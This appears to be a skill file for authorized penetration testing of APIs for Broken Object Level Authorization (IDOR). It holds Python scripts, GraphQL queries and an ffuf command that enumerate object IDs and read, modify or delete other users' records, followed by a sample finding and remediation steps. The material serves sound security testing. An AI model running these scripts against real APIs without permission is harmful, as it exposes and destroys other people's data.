---
name: testing-api-for-broken-object-level-authorization
description: >
  Tests REST and GraphQL APIs for Broken Object Level Authorization (BOLA/IDOR) vulnerabilities
  where an authenticated user can access or modify resources belonging to other users by
  manipulating object identifiers in API requests. The tester intercepts API calls, identifies
  object ID parameters (numeric IDs, UUIDs, slugs), and systematically replaces them with IDs
  belonging to other users to determine if the server enforces per-object authorization. This
  is OWASP API Security Top 10 2023 risk API1. Activates for requests involving BOLA testing,
  IDOR in APIs, object-level authorization testing, or API access control bypass.
domain: cybersecurity
subdomain: api-security
tags: [api-security, owasp, bola, idor, authorization, rest-security]
version: 1.0.0
author: mahipal
license: Apache-2.0
---
# Testing API for Broken Object Level Authorization

## When to Use

- Assessing REST or GraphQL APIs that use object identifiers in URL paths, query parameters, or request bodies
- Performing OWASP API Security Top 10 assessments where API1:2023 (BOLA) must be tested
- Testing multi-tenant SaaS applications where users from different tenants should not access each other's data
- Validating that API endpoints enforce per-object authorization checks beyond just authentication
- Evaluating APIs after new endpoints are added to ensure authorization middleware is applied consistently

**Do not use** without written authorization from the API owner. BOLA testing involves accessing or attempting to access other users' data, which requires explicit permission.

## Prerequisites

- Written authorization specifying the target API endpoints and scope of testing
- At least two test accounts with different privilege levels and distinct data sets
- Burp Suite Professional or OWASP ZAP configured as an intercepting proxy
- Authentication tokens (JWT, session cookies, API keys) for each test account
- API documentation (OpenAPI/Swagger spec) or access to enumerate endpoints
- Python 3.10+ with `requests` library for scripted testing
- Autorize Burp extension installed for automated BOLA detection

## Workflow

### Step 1: API Endpoint Discovery and Object ID Mapping

Enumerate all API endpoints and identify parameters that reference objects:

**From OpenAPI/Swagger Specification:**
```bash
# Download and parse the OpenAPI spec
curl -s https://target-api.example.com/api/docs/swagger.json | python3 -m json.tool

# Extract all endpoints with path parameters
curl -s https://target-api.example.com/api/docs/swagger.json | \
  python3 -c "
import json, sys
spec = json.load(sys.stdin)
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        if method in ('get','post','put','patch','delete'):
            params = [p['name'] for p in details.get('parameters',[]) if p.get('in') in ('path','query')]
            if params:
                print(f'{method.upper()} {path} -> params: {params}')
"
```

**From Burp Suite Traffic:**
1. Browse the application as User A, exercising all features that involve data creation and retrieval
2. In Burp, go to Target > Site Map and filter for API paths (e.g., `/api/v1/`, `/graphql`)
3. Look for patterns: `/api/v1/users/{id}`, `/api/v1/orders/{order_id}`, `/api/v1/documents/{doc_uuid}`
4. Note the object ID format: sequential integers (predictable), UUIDs (less predictable), or encoded values

**Classify Object ID Types:**

| ID Type | Example | Predictability | BOLA Risk |
|---------|---------|---------------|-----------|
| Sequential Integer | `/orders/1042` | High - increment/decrement | Critical |
| UUID v4 | `/orders/550e8400-e29b-41d4-a716-446655440000` | Low - random | Medium (if leaked) |
| Encoded/Hashed | `/orders/base64encodedvalue` | Medium - decode and predict | High |
| Composite | `/users/42/orders/1042` | High - multiple IDs to swap | Critical |
| Slug | `/profiles/john-doe` | Medium - guess usernames | High |

### Step 2: Baseline Request Capture with Authenticated User

Capture legitimate requests for User A and User B:

```python
import requests

BASE_URL = "https://target-api.example.com/api/v1"

# User A credentials
user_a_token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
user_a_headers = {"Authorization": user_a_token, "Content-Type": "application/json"}

# User B credentials
user_b_token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
user_b_headers = {"Authorization": user_b_token, "Content-Type": "application/json"}

# Step 1: Identify User A's objects
user_a_profile = requests.get(f"{BASE_URL}/users/me", headers=user_a_headers)
user_a_id = user_a_profile.json()["id"]  # e.g., 1001

user_a_orders = requests.get(f"{BASE_URL}/users/{user_a_id}/orders", headers=user_a_headers)
user_a_order_ids = [o["id"] for o in user_a_orders.json()["orders"]]  # e.g., [5001, 5002]

# Step 2: Identify User B's objects
user_b_profile = requests.get(f"{BASE_URL}/users/me", headers=user_b_headers)
user_b_id = user_b_profile.json()["id"]  # e.g., 1002

user_b_orders = requests.get(f"{BASE_URL}/users/{user_b_id}/orders", headers=user_b_headers)
user_b_order_ids = [o["id"] for o in user_b_orders.json()["orders"]]  # e.g., [5003, 5004]

print(f"User A (ID: {user_a_id}): Orders {user_a_order_ids}")
print(f"User B (ID: {user_b_id}): Orders {user_b_order_ids}")
```

### Step 3: BOLA Testing - Horizontal Privilege Escalation

Attempt to access User B's objects using User A's authentication:

```python
import json

results = []

# Test 1: Access User B's profile with User A's token
resp = requests.get(f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)
results.append({
    "test": "Access other user profile",
    "endpoint": f"GET /users/{user_b_id}",
    "auth": "User A",
    "status": resp.status_code,
    "vulnerable": resp.status_code == 200,
    "data_leaked": list(resp.json().keys()) if resp.status_code == 200 else None
})

# Test 2: Access User B's orders with User A's token
for order_id in user_b_order_ids:
    resp = requests.get(f"{BASE_URL}/orders/{order_id}", headers=user_a_headers)
    results.append({
        "test": f"Access other user order {order_id}",
        "endpoint": f"GET /orders/{order_id}",
        "auth": "User A",
        "status": resp.status_code,
        "vulnerable": resp.status_code == 200
    })

# Test 3: Modify User B's order with User A's token
resp = requests.patch(
    f"{BASE_URL}/orders/{user_b_order_ids[0]}",
    headers=user_a_headers,
    json={"status": "cancelled"}
)
results.append({
    "test": "Modify other user order",
    "endpoint": f"PATCH /orders/{user_b_order_ids[0]}",
    "auth": "User A",
    "status": resp.status_code,
    "vulnerable": resp.status_code in (200, 204)
})

# Test 4: Delete User B's resource with User A's token
resp = requests.delete(f"{BASE_URL}/orders/{user_b_order_ids[0]}", headers=user_a_headers)
results.append({
    "test": "Delete other user order",
    "endpoint": f"DELETE /orders/{user_b_order_ids[0]}",
    "auth": "User A",
    "status": resp.status_code,
    "vulnerable": resp.status_code in (200, 204)
})

# Print results
for r in results:
    status = "VULNERABLE" if r["vulnerable"] else "SECURE"
    print(f"[{status}] {r['test']}: {r['endpoint']} -> HTTP {r['status']}")
```

### Step 4: Advanced BOLA Techniques

Test for less obvious BOLA patterns:

```python
# Technique 1: Parameter pollution - send both IDs
resp = requests.get(
    f"{BASE_URL}/orders/{user_a_order_ids[0]}?order_id={user_b_order_ids[0]}",
    headers=user_a_headers
)
print(f"Parameter pollution: {resp.status_code}")

# Technique 2: JSON body object ID override
resp = requests.post(
    f"{BASE_URL}/orders/details",
    headers=user_a_headers,
    json={"order_id": user_b_order_ids[0]}
)
print(f"Body ID override: {resp.status_code}")

# Technique 3: Array of IDs - include other user's IDs in batch request
resp = requests.post(
    f"{BASE_URL}/orders/batch",
    headers=user_a_headers,
    json={"order_ids": user_a_order_ids + user_b_order_ids}
)
print(f"Batch ID inclusion: {resp.status_code}, returned {len(resp.json().get('orders',[]))} orders")

# Technique 4: Numeric ID manipulation for sequential IDs
for offset in range(-5, 6):
    test_id = user_a_order_ids[0] + offset
    if test_id not in user_a_order_ids:
        resp = requests.get(f"{BASE_URL}/orders/{test_id}", headers=user_a_headers)
        if resp.status_code == 200:
            owner = resp.json().get("user_id", "unknown")
            if str(owner) != str(user_a_id):
                print(f"BOLA: Order {test_id} belongs to user {owner}, accessible by User A")

# Technique 5: Swap object ID in nested resource paths
resp = requests.get(
    f"{BASE_URL}/users/{user_b_id}/orders/{user_b_order_ids[0]}/invoice",
    headers=user_a_headers
)
print(f"Nested resource BOLA: {resp.status_code}")

# Technique 6: Method switching - GET may be blocked but PUT allowed
for method in ['GET', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']:
    resp = requests.request(
        method,
        f"{BASE_URL}/users/{user_b_id}/settings",
        headers=user_a_headers,
        json={"notifications": False} if method in ('PUT', 'PATCH') else None
    )
    if resp.status_code not in (401, 403, 405):
        print(f"Method {method} on other user settings: {resp.status_code}")
```

### Step 5: Automated BOLA Detection with Autorize (Burp Suite)

Configure Autorize for automated detection:

1. Install Autorize from the BApp Store in Burp Suite Professional
2. In the Autorize tab, paste User B's authentication cookie or header
3. Configure the interception filters:
   - Include: `.*\/api\/.*` (only API paths)
   - Exclude: `.*\.(js|css|png|jpg)$` (skip static assets)
4. Set the enforcement detector:
   - Add conditions where response length or status code differs between User A and User B
   - Mark as "enforced" if User A gets 403/401 for User B's resources
   - Mark as "bypassed" if User A gets 200 with User B's data
5. Browse the application as User A; Autorize automatically replays each request with User B's token
6. Review the Autorize results table:
   - Green = Authorization enforced (secure)
   - Red = Authorization bypassed (BOLA vulnerability)
   - Orange = Needs manual review (ambiguous response)

### Step 6: GraphQL BOLA Testing

```graphql
# Test BOLA in GraphQL queries using node/ID relay pattern
# User A queries User B's order by global relay ID
query {
  node(id: "T3JkZXI6NTAwMw==") {  # Base64 of "Order:5003" (User B's)
    ... on Order {
      id
      totalAmount
      shippingAddress {
        street
        city
      }
      items {
        productName
        quantity
      }
    }
  }
}

# Test nested object access through relationships
query {
  user(id: "1002") {  # User B's ID
    email
    phoneNumber
    orders {
      edges {
        node {
          id
          totalAmount
          paymentMethod {
            lastFourDigits
          }
        }
      }
    }
  }
}
```

## Key Concepts

| Term | Definition |
|------|------------|
| **BOLA** | Broken Object Level Authorization (OWASP API1:2023) - the API does not verify that the authenticated user has permission to access the specific object referenced by the request |
| **IDOR** | Insecure Direct Object Reference - a closely related term where the application uses user-controllable input to directly access objects without authorization checks |
| **Horizontal Privilege Escalation** | Accessing resources belonging to another user at the same privilege level by manipulating object identifiers |
| **Vertical Privilege Escalation** | Accessing resources or functions restricted to a higher privilege level (e.g., regular user accessing admin endpoints) |
| **Object ID Enumeration** | Predicting valid object identifiers by analyzing their format (sequential integers, UUID patterns, encoded values) |
| **Autorize** | A Burp Suite extension that automates authorization testing by replaying requests with different user tokens |

## Tools & Systems

- **Burp Suite Professional**: Intercepting proxy for capturing and manipulating API requests with Autorize extension for automated BOLA testing
- **OWASP ZAP**: Open-source alternative with Access Control Testing add-on for authorization boundary testing
- **Autorize**: Burp extension that automatically detects authorization enforcement by replaying requests with different user contexts
- **Postman**: API testing platform for crafting and replaying requests with different authentication tokens across collections
- **ffuf**: Web fuzzer that can enumerate object IDs at scale: `ffuf -u https://api.example.com/orders/FUZZ -w ids.txt -H "Authorization: Bearer token"`

## Common Scenarios

### Scenario: E-Commerce API BOLA Assessment

**Context**: An e-commerce platform exposes a REST API for its mobile app. The API uses sequential integer IDs for orders, users, and addresses. Two test accounts are provided: a regular customer (User A, ID 1001) and another customer (User B, ID 1002).

**Approach**:
1. Map all endpoints from the Swagger spec at `/api/docs`: identify 47 endpoints, 23 of which take object IDs
2. Capture User A's requests for their own resources: profile, orders, addresses, payment methods, wishlist
3. Replace User A's object IDs with User B's IDs systematically across all 23 endpoints
4. Find that `GET /api/v1/orders/{id}` returns any order regardless of ownership (BOLA on read)
5. Find that `PATCH /api/v1/addresses/{id}` allows modifying any user's address (BOLA on write)
6. Find that `GET /api/v1/users/{id}/payment-methods` leaks payment card last-four digits for any user
7. Test batch endpoint `POST /api/v1/orders/export` - accepts array of order IDs and exports all without ownership check
8. Verify that `DELETE /api/v1/orders/{id}` correctly returns 403 for non-owned orders (authorization enforced)

**Pitfalls**:
- Only testing GET requests and missing BOLA in PUT/PATCH/DELETE methods that allow data modification or destruction
- Assuming UUIDs prevent BOLA - UUIDs are less predictable but can be leaked in API responses, logs, or URL parameters
- Not testing nested resource paths where authorization may be checked on the parent but not the child resource
- Missing BOLA in bulk/batch endpoints that accept arrays of object IDs
- Not considering that different API versions (v1 vs v2) may have different authorization implementations

## Output Format

```
## Finding: Broken Object Level Authorization in Order API

**ID**: API-BOLA-001
**Severity**: High (CVSS 7.5)
**OWASP API**: API1:2023 - Broken Object Level Authorization
**Affected Endpoints**:
  - GET /api/v1/orders/{id}
  - PATCH /api/v1/addresses/{id}
  - GET /api/v1/users/{id}/payment-methods
  - POST /api/v1/orders/export

**Description**:
The API does not enforce object-level authorization on order retrieval,
address modification, payment method viewing, or order export endpoints.
An authenticated user can access or modify any other user's resources by
substituting object IDs in the request. Sequential integer IDs make
enumeration trivial.

**Proof of Concept**:
1. Authenticate as User A (ID 1001): POST /api/v1/auth/login
2. Retrieve User A's order: GET /api/v1/orders/5001 -> 200 OK (legitimate)
3. Access User B's order: GET /api/v1/orders/5003 -> 200 OK (BOLA - returns full order details)
4. Modify User B's address: PATCH /api/v1/addresses/2002 -> 200 OK (BOLA - address changed)

**Impact**:
- Read access to all 850,000+ customer orders including shipping addresses and order contents
- Write access to any customer's delivery address, enabling package redirection
- Exposure of partial payment card data for all customers

**Remediation**:
1. Implement object-level authorization middleware that verifies the authenticated user owns the requested resource
2. Use authorization checks at the data access layer: `WHERE order.user_id = authenticated_user.id`
3. Replace sequential integer IDs with UUIDs to reduce predictability (defense in depth, not a fix alone)
4. Add authorization tests to the CI/CD pipeline for every endpoint that accepts object IDs
5. Implement rate limiting per user to slow enumeration attempts
```
